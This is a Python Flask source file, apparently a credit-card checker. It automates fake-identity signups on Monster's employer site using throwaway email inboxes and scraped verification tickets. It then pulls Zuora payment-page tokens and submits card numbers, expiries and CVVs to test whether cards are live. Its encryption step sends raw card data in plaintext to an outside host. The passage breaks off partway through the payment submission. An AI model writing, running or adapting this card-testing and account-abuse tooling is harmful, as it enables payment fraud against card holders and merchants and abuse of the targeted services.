from flask import Flask, request, jsonify
import requests
import json
import re
import random
import string
from requests import Session
from base64 import b64encode, b64decode
from time import sleep
from typing import Dict, Optional
from faker import Faker
from urllib.parse import urljoin

app = Flask(__name__)

_fake = Faker("en_US")
GatewaysErrorStatus = False

class GatewaysDeveloper:
    _MaxRetrys = 3

    def __init__(self):
        self._MailTMCredentials = {}
        self.session = Session()
        self.email = None
        self.email_username = None
        self.email_domain = None
        self.email_cookies = {}

    def _Capture(self, text, start, end):
        try:
            s = text.index(start) + len(start)
            return text[s:text.index(end, s)]
        except:
            return None

    def _GenerateRandomData(self):
        return (
            _fake.street_address(),
            _fake.city(),
            _fake.state(),
            _fake.state_abbr(),
            _fake.zipcode(),
            _fake.numerify("##########"),
            _fake.user_name(),
            _fake.email(),
            "PijaDura!760",
            _fake.first_name(),
            _fake.last_name()
        )

    def _GetProxy(self, _ProxyService="Apify", _Country="US"):
        return None

    def _CreateSessionWeb(self, _ServiceWeb="Requests", _ProxyWeb=None):
        s = Session()
        if _ProxyWeb:
            s.proxies = {"http": _ProxyWeb, "https": _ProxyWeb}
        return s

    def get_headers(self, token=None):
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'origin': 'chrome-extension://fpdkjdnhkakefebpekbdhillbhonfjjp',
            'priority': 'u=1, i',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
        }
        if token:
            headers['Authorization'] = f'Bearer {token}'
        return headers

    def get_generator_headers(self):
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="146", "Google Chrome";v="146", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1'
        }

    def get_generator_api_headers(self):
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://generator.email',
            'Referer': 'https://generator.email/',
            'sec-ch-ua': '"Chromium";v="146", "Google Chrome";v="146", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }

    def get_random_domain(self) -> str:
        vowels = 'aeiou'
        consonants = 'bcdfghjklmnpqrstvwxyz'
        keyword = random.choice(consonants) + random.choice(vowels)
        
        for attempt in range(5):
            try:
                response = self.session.get(
                    f'https://generator.email/search.php?key={keyword}',
                    headers=self.get_headers()
                )
                domains = json.loads(response.text)
                valid_domains = [d for d in domains if all(ord(c) < 128 for c in d)]
                if valid_domains:
                    return random.choice(valid_domains)
            except Exception as e:
                if attempt == 4:
                    return "casinolotte.com"
                sleep(1)
        return "casinolotte.com"

    def generate_email_username(self, domain: str) -> str:
        first_names = ['john', 'mike', 'david', 'chris', 'tom', 'eric', 'kevin', 'brian', 'steve', 'mark']
        last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez']
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        random_nums = ''.join(random.choices(string.digits, k=3))
        
        separator = random.choice(['', '.', '_'])
        self.email_username = f"{first_name}{separator}{last_name}{random_nums}"
        return self.email_username

    def get_email_cookies(self) -> Dict[str, str]:
        self.email_domain = self.get_random_domain()
        self.generate_email_username(self.email_domain)
        self.email = f"{self.email_username}@{self.email_domain}"
        
        self.email_cookies = {
            'embx': f'["{self.email}"]',
            'surl': f'{self.email_domain}/{self.email_username}'
        }
        
        response = self.session.get('https://generator.email/', headers=self.get_generator_headers())
        for cookie in self.session.cookies:
            self.email_cookies[cookie.name] = cookie.value
        
        return self.email_cookies

    def create_email(self) -> bool:
        headers = self.get_generator_api_headers()
        data = {'usr': self.email_username, 'dmn': self.email_domain}
        
        response = self.session.post('https://generator.email/check_mail.php', headers=headers, data=data)
        try:
            result = json.loads(response.text)
            return result.get('status') == 'ok'
        except:
            return True

    def fetch_verification_direct(self, max_attempts=30) -> Optional[str]:
        if not self.email_username or not self.email_domain:
            raise Exception("No email created")
        
        headers = self.get_generator_headers()
        headers['Cookie'] = f'embx=["{self.email}"]; surl={self.email_domain}/{self.email_username}'
        
        for attempt in range(max_attempts):
            try:
                response = self.session.get('https://generator.email/inbox3/', headers=headers)
                
                if response.status_code == 200:
                    match = re.search(r'ticket=([A-Za-z0-9]+)', response.text)
                    if match:
                        return match.group(1)
                
                sleep(3)
                
            except Exception as e:
                sleep(3)
        
        return None

    def _CreateTempEmail(self, _Provider="Generator"):
        self.get_email_cookies()
        if not self.create_email():
            raise Exception("Failed to create email")
        return self.email

    def _Encrypt(self, _Card="", _Mm="", _Yy="", _Cvv=""):
        try:
            cc_string = f"{_Card}|{_Mm}|{_Yy}|{_Cvv}"
            response = requests.get(f"https://erovix.xyz/Eway/enc.php?cc={cc_string}")
            if response.status_code == 200:
                data = response.json()
                return data.get('encrypted', '')
        except:
            pass
        return ""

    def _VerifyStatusResponse(self, message):
        _live = ["Transaction declined.2010 - Card Issuer Declined CVV", "Approved"]
        return any(k.lower() in message.lower() for k in _live)

    def Run(self, _card, _mm, _yy, _cvv):
        message, status = self._Execute(_card, _mm, _yy, _cvv)
        return {
            "status": True,
            "succes": bool(status),
            "gateway-response": message,
            "api-response": "Approved! ✅" if status else "Declined ❌",
            "gateway-type": "Zuora + Braintree",
            "gateway-mode": "auth",
            "gateway-amount": 0.00,
            "gateway-currency": "USD"
        }

    def _Execute(self, _card, _mm, _yy, _cvv):
        for attempt in range(self._MaxRetrys):
            address, city, state, statecode, zipcode, phone, username, email, password, name1, name2 = self._GenerateRandomData()
            web = self._CreateSessionWeb(_ServiceWeb="Requests", _ProxyWeb=None)
            
            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                req = web.get("https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1", headers=headers, allow_redirects=False)
                AuthorizeUrl = req.headers.get("location", req.headers.get("Location", ""))
                if not AuthorizeUrl:
                    SiteError = "Failed Getting Authorize URL (Request 1)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Authorize URL (Request 1) | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Referer": "https://manage.monster.com/",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                req = web.get(AuthorizeUrl, headers=headers)
                UlpUrl = req.url
                B64Match = re.search(r'window\.atob\(["\']([A-Za-z0-9+/=]+)["\']\)', req.text)
                if not B64Match:
                    SiteError = "Failed to find Auth0 config"
                    continue
                Config = json.loads(b64decode(B64Match.group(1) + "==").decode("utf-8", "replace"))
                ClientId = Config["clientID"]
                AuthState1 = Config["extraParams"]["state"]
                Nonce1 = Config["extraParams"]["nonce"]
                Csrf1 = Config["extraParams"]["_csrf"]
                Auth0ClientH = b64encode(b'{"name":"auth0.js","version":"9.15.0"}').decode()
                if not ClientId or not AuthState1 or not Nonce1 or not Csrf1:
                    SiteError = "Failed Getting Auth0 Config values (Request 2)"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Auth0 Config (Request 2) | {u}"
                continue

            TempMail = self._CreateTempEmail(_Provider="Generator")
            
            try:
                headers = {
                    "Accept": "*/*",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Auth0-Client": Auth0ClientH,
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Host": "hiring-identity.monster.com",
                    "Origin": "https://hiring-identity.monster.com",
                    "Referer": UlpUrl,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                json_data = {
                    "client_id": ClientId,
                    "state": AuthState1,
                    "connection": "Username-Password-Authentication",
                    "email": TempMail,
                    "password": "PijaDura!760",
                    "user_metadata": {
                        "tier": "free",
                        "emailNotifications": "true",
                        "language": "en-US",
                        "domain": "https://manage.monster.com/"
                    }
                }
                req = web.post("https://hiring-identity.monster.com/dbconnections/signup", headers=headers, json=json_data)
                
                if "_id" not in req.text:
                    SiteError = f"Failed Signup (Request 3): {req.text}"
                    continue
            except Exception as u:
                SiteError = f"Failed Signup (Request 3) | {u}"
                continue

            try:
                CodeOtp = self.fetch_verification_direct()
                if not CodeOtp:
                    SiteError = "Failed Getting Verification Ticket"
                    continue
            except Exception as u:
                SiteError = f"Error Getting Verification Ticket | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Host": "hiring-identity.monster.com",
                    "Referer": "https://manage.monster.com/",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                req = web.get(f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", headers=headers)
                StateVerifyMail = self._Capture(req.text, 'name="state" value="', '"')
                if not StateVerifyMail:
                    SiteError = "Failed Getting Verify Page State"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Verify Page | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "hiring-identity.monster.com",
                    "Origin": "https://hiring-identity.monster.com",
                    "Referer": f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                data = {"state": StateVerifyMail}
                req = web.post(f"https://hiring-identity.monster.com/u/email-verification?ticket={CodeOtp}", headers=headers, data=data)
                if "verified" in req.url.lower() or "Your+email" in req.url or "success" in req.url.lower():
                    pass
                else:
                    SiteError = "Failed Verify Email"
                    continue
            except Exception as u:
                SiteError = f"Failed Verify Email | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                req = web.get("https://manage.monster.com/auth/login?r=%2Fdashboard&keepSessionInfo=true&apigeeApiKey=4u8nirp5l6ugasm1im1itrg0er&employerEnvironment=prod-ams&employerLocale=en-US&employerHost=https%3A%2F%2Fmanage.monster.com&employerBffDomain=https%3A%2F%2Fappsapi.monster.io%2Femployer-bff%2Fv1", headers=headers, allow_redirects=False)
                AuthorizeUrl2 = req.headers.get("location", req.headers.get("Location", ""))
                if not AuthorizeUrl2:
                    SiteError = "Failed Getting Fresh Authorize URL"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Fresh Authorize URL | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Referer": "https://manage.monster.com/",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                req = web.get(AuthorizeUrl2, headers=headers)
                UlpUrl2 = req.url
                B64Match2 = re.search(r'window\.atob\(["\']([A-Za-z0-9+/=]+)["\']\)', req.text)
                Config2 = json.loads(b64decode(B64Match2.group(1) + "==").decode("utf-8", "replace"))
                AuthState2 = Config2["extraParams"]["state"]
                Nonce2 = Config2["extraParams"]["nonce"]
                Csrf2 = Config2["extraParams"]["_csrf"]
                if not AuthState2 or not Nonce2 or not Csrf2:
                    SiteError = "Failed Getting Fresh Auth0 Config values"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Fresh Auth0 Config | {u}"
                continue

            try:
                headers = {
                    "Accept": "*/*",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Auth0-Client": Auth0ClientH,
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Host": "hiring-identity.monster.com",
                    "Origin": "https://hiring-identity.monster.com",
                    "Referer": UlpUrl2,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                json_data = {
                    "client_id": ClientId,
                    "redirect_uri": "https://manage.monster.com/auth/callback",
                    "tenant": "monster-employer-prod",
                    "response_type": "code",
                    "scope": "openid email profile offline_access",
                    "audience": "employer-bff-api-gateway",
                    "state": AuthState2,
                    "_csrf": Csrf2,
                    "_intstate": "deprecated",
                    "nonce": Nonce2,
                    "username": TempMail,
                    "password": "PijaDura!760",
                    "connection": "Username-Password-Authentication"
                }
                req = web.post("https://hiring-identity.monster.com/usernamepassword/login", headers=headers, json=json_data)
                
                FormAction = self._Capture(req.text, 'action="', '"')
                WaVal = self._Capture(req.text, 'name="wa" value="', '"')
                WresultMatch = re.search(r'name="wresult"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL) or re.search(r'name="wresult"\s+value="([^"]+)"', req.text, re.DOTALL)
                WctxMatch = re.search(r'name="wctx"[^>]*\s+value="([^"]+)"', req.text, re.DOTALL) or re.search(r'name="wctx"\s+value="([^"]+)"', req.text, re.DOTALL)
                WresultRaw = WresultMatch.group(1) if WresultMatch else None
                WctxRaw = WctxMatch.group(1) if WctxMatch else None
                
                if not FormAction or not WaVal or not WresultRaw:
                    SiteError = "Failed Auth0 Login"
                    continue
            except Exception as u:
                SiteError = f"Failed Auth0 Login | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "hiring-identity.monster.com",
                    "Origin": "https://hiring-identity.monster.com",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                headers2 = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                Wresult = WresultRaw.replace("&#34;", '"').replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
                Wctx = (WctxRaw or "").replace("&#34;", '"').replace("&amp;", "&")
                data = {"wa": WaVal, "wresult": Wresult, "wctx": Wctx}
                
                callback_response = web.post(FormAction, headers=headers, data=data, allow_redirects=False)
                
                if callback_response.status_code in [301, 302, 303, 307]:
                    redirect_url = callback_response.headers.get('location', callback_response.headers.get('Location', ''))
                    if redirect_url:
                        if redirect_url.startswith('/'):
                            redirect_url = urljoin("https://hiring-identity.monster.com", redirect_url)
                        req = web.get(redirect_url, headers=headers2, allow_redirects=True)
                    else:
                        req = web.get("https://manage.monster.com/en-us/accountCreation", headers=headers2)
                else:
                    req = web.get("https://manage.monster.com/en-us/accountCreation", headers=headers2)
                
                Bearer = self._Capture(req.text, '"accessToken":"', '"')
                DeviceId = self._Capture(req.text, '"device_id":"', '"') or ""
                
                if not Bearer:
                    Bearer = self._Capture(req.text, '"access_token":"', '"')
                
                if not Bearer:
                    SiteError = "Failed Getting Bearer"
                    continue
            except Exception as u:
                SiteError = f"Failed Auth0 Callback | {u}"
                continue

            try:
                headers = {
                    "Accept": "*/*",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Authorization": f"Bearer {Bearer}",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Host": "appsapi.monster.io",
                    "Origin": "https://manage.monster.com",
                    "Referer": "https://manage.monster.com/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "x-employer-locale": "en-US",
                    "x-employer-origin": "https://manage.monster.com",
                    "x-employer-tracking-device-id": DeviceId
                }
                json_data = {
                    "operationName": "CreateAccount",
                    "query": "mutation CreateAccount($accountInput: AccountInput!) {\n  createAccount(accountInput: $accountInput) {\n    accountId\n    companyName\n    customerWebsite\n    __typename\n  }\n}\n",
                    "variables": {
                        "accountInput": {
                            "accountName": "PINGADURA INC",
                            "contactFirstName": name1,
                            "contactLastName": name2,
                            "email": TempMail,
                            "phone": "9898989898",
                            "country": "US",
                            "signUpDomain": ".com",
                            "customerWebsite": "",
                            "subPremise": "",
                            "addressLocality": "Boston",
                            "addressRegion": "MA",
                            "postalCode": "02108",
                            "streetAddress": "Acorn Street"
                        }
                    }
                }
                req = web.post("https://appsapi.monster.io/employer-bff/v1/graphql?apiKey=4u8nirp5l6ugasm1im1itrg0er", headers=headers, json=json_data)
                AccountId = self._Capture(req.text, '"accountId":"', '"')
                if not AccountId:
                    SiteError = f"Failed Creating Account: {req.text[:200]}"
                    continue
            except Exception as u:
                SiteError = f"Failed Creating Account | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Host": "manage.monster.com",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                req = web.get("https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459", headers=headers)
                AccountId = self._Capture(req.text, '"AccountBillingInfo","accountId":"', '"')
                Bearer = self._Capture(req.text, '"accessToken":"', '"')
                DeviceId = self._Capture(req.text, '"device_id":"', '"') or DeviceId
                if not AccountId or not Bearer:
                    SiteError = "Failed Getting Token Account Id"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Token Account Id | {u}"
                continue

            try:
                headers = {
                    "Accept": "*/*",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Authorization": f"Bearer {Bearer}",
                    "Connection": "keep-alive",
                    "Content-Type": "application/json",
                    "Host": "appsapi.monster.io",
                    "Origin": "https://manage.monster.com",
                    "Referer": "https://manage.monster.com/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "x-employer-account-id": AccountId,
                    "x-employer-locale": "en-US",
                    "x-employer-origin": "https://manage.monster.com",
                    "x-employer-tracking-device-id": DeviceId
                }
                json_data = {
                    "operationName": "GetPaymentPageInfo",
                    "query": "query GetPaymentPageInfo($paymentInfoInput: PaymentInfoInput!) {\n  paymentInfo(paymentInfoInput: $paymentInfoInput) {\n    apiUrl\n    billingAccountId\n    paymentPageId\n    signature\n    token\n    publicKey\n    tenantId\n    __typename\n  }\n}\n",
                    "variables": {
                        "paymentInfoInput": {
                            "accountId": AccountId,
                            "paymentMethod": "credit_card"
                        }
                    }
                }
                req = web.post("https://appsapi.monster.io/employer-bff/v1/graphql?apiKey=4u8nirp5l6ugasm1im1itrg0er", headers=headers, json=json_data)
                ZuoraId = self._Capture(req.text, 'paymentPageId":"', '"')
                ZuoraTenantId = self._Capture(req.text, 'tenantId":"', '"')
                ZuoraToken = self._Capture(req.text, 'token":"', '"')
                ZuoraFieldAccountId = self._Capture(req.text, 'billingAccountId":"', '"')
                ZuoraSignature = self._Capture(req.text, 'signature":"', '"')
                if not ZuoraId or not ZuoraTenantId or not ZuoraToken or not ZuoraFieldAccountId or not ZuoraSignature:
                    SiteError = "Failed Getting Tokens Zuora Iframe"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Tokens Zuora Iframe | {u}"
                continue

            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Host": "www.zuora.com",
                    "Referer": "https://manage.monster.com/",
                    "Sec-Fetch-Storage-Access": "none",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                params = {
                    "method": "requestPage",
                    "host": "https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459",
                    "fromHostedPage": "true",
                    "id": ZuoraId,
                    "tenantId": ZuoraTenantId,
                    "locale": "en_US",
                    "token": ZuoraToken,
                    "paymentGateway": "",
                    "style": "inline",
                    "submitEnabled": "false",
                    "field_accountId": ZuoraFieldAccountId,
                    "countryBlackList": "AFG,ALB,BLR,BIH,CAF,CHN,CUB,PRK,COD,EGY,ERI,GNB,HTI,IRN,IRQ,XKX,LBN,LBY,MDA,MNE,MMR,GIN,MKD,RUS,SRB,SOM,SSD,SDN,SYR,TUN,UKR,VEN,YEM,ZWE,ARG,AZE,BRA,CHL,COL,DOM,ECU,ETH,GEO,IDN,KAZ,KEN,NGA,VNM",
                    "field_passthrough1": AccountId,
                    "signature": ZuoraSignature,
                    "retainValues": "true",
                    "zlog_level": "warn"
                }
                req = web.get("https://www.zuora.com/apps/PublicHostedPageLite.do", headers=headers, params=params)
                ZuoraId = self._Capture(req.text, 'name="id" id="id" value="', '"')
                ZuoraTenantId = self._Capture(req.text, 'name="tenantId" id="tenantId" value="', '"')
                ZuoraToken = self._Capture(req.text, 'name="token" id="token" value="', '"')
                ZuoraSignature = self._Capture(req.text, 'name="signature" id="signature" value="', '"')
                ZuoraFieldKey = self._Capture(req.text, 'name="field_key" value="', '"')
                Zuoraxjd28s_6sk = self._Capture(req.text, 'name="xjd28s_6sk" id="xjd28s_6sk" value="', '"')
                if not ZuoraId or not ZuoraTenantId or not ZuoraToken or not ZuoraSignature or not ZuoraFieldKey or not Zuoraxjd28s_6sk:
                    SiteError = "Failed Getting Zuora Iframe Tokens"
                    continue
            except Exception as u:
                SiteError = f"Failed Getting Zuora Iframe Tokens | {u}"
                continue

            try:
                EncryptCard = self._Encrypt(_Card=_card, _Mm=_mm, _Yy=_yy, _Cvv=_cvv)
                if not EncryptCard:
                    SiteError = "Failed to encrypt card"
                    continue
                
                headers = {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Host": "www.zuora.com",
                    "Origin": "https://www.zuora.com",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "X-Requested-With": "XMLHttpRequest"
                }
                data = {
                    "method": "submitPage",
                    "id": ZuoraId,
                    "tenantId": ZuoraTenantId,
                    "token": ZuoraToken,
                    "signature": ZuoraSignature,
                    "paymentGateway": "",
                    "field_authorizationAmount": "",
                    "field_screeningAmount": "",
                    "field_currency": "",
                    "field_key": ZuoraFieldKey,
                    "locale": "en_US",
                    "field_style": "inline",
                    "jsVersion": "",
                    "field_submitEnabled": "false",
                    "field_callbackFunctionEnabled": "",
                    "field_signatureType": "",
                    "host": "https://manage.monster.com/en-us/membershipPayment?planId=8a128c1b888ec3c0018891010c3c0459",
                    "encrypted_fields": "#field_ipAddress#field_creditCardNumber#field_cardSecurityCode#field_creditCardExpirationMonth#field_creditCardExpirationYear",
                    "encrypted_values": EncryptCard,
                    "customizeErrorRequired": "",
                    "fromHostedPage": "true",
                    "isGScriptLoaded": "false",
                    "is3DSEnabled": "",
                    "checkDuplicated": "",
                    "captchaRequired": "",
                    "captchaSiteKey": "",
                    "field_mitConsentAgreementSrc": "",
                    "field_mitConsentAgreementRef": "",
                    "field_mitCredentialProfileType": "",
                    "field_agreementSupportedBrands": "",
                    "paymentGatewayType": "",
                    "paymentGatewayVersion": "",
                    "is3DS2Enabled": "",
                    "cardMandateEnabled": "",
                    "zThreeDs2TxId": "",
                    "threeDs2token": "",
                    "threeDs2Sig": "",
                    "threeDs2Ts": "",
                    "threeDs2OnStep": "",
                    "threeDs2GwData": "",
                    "doPayment": "",
                    "storePaymentMethod": "",
                    "documents": "",
                    "xjd28s_6sk": Zuoraxjd28s_6sk,
                    "pmId": "",
                    "button_outside_force_redirect": "false",
                    "browserScreenHeight": "1026",
                    "browserScreenWidth": "1824",
                    "field_passthrough1": AccountId,
                    "field_passthrough2": "",
                    "field_passthrough3": "",
                    "field_passthrough4": "",
                    "field_passthrough5": "",
                    "field_passthrough6": "",
                    "field_passthrough7": "",
                    "field_passthrough8": "",
                    "field_passthrough9": "",
                    "field_passthrough10": "",
                    "field_passthrough11": "",
                    "field_passthrough12": "",
                    "field_passthrough13": "",
                    "field_passthrough14": "",
                    "field_passthrough15": "",
                    "field_accountId": ZuoraFieldAccountId,
                    "field_gatewayName": "",
                    "field_deviceSessionId": "",
                    "field_ipAddress": "",
                    "field_useDefaultRetryRule": "",
                    "field_paymentRetryWindow": "",
                    "field_maxConsecutivePaymentFailures": "",
                    "field_creditCardAddress1": address,
                    "field_creditCardAddress2": address,
                    "field_creditCardCity": city,
                    "field_creditCardCountry": "USA",
                    "field_creditCardState": "New York",
                    "field_creditCardPostalCode": "10081",
                    "field_creditCardNumber": "",
                    "field_creditCardType": "Visa",
                    "field_creditCardExpirationMonth": "",
                    "field_creditCardExpirationYear": "",
                    "field_cardSecurityCode": "",
                    "field_creditCardHolderName": name1 + " " + name2,
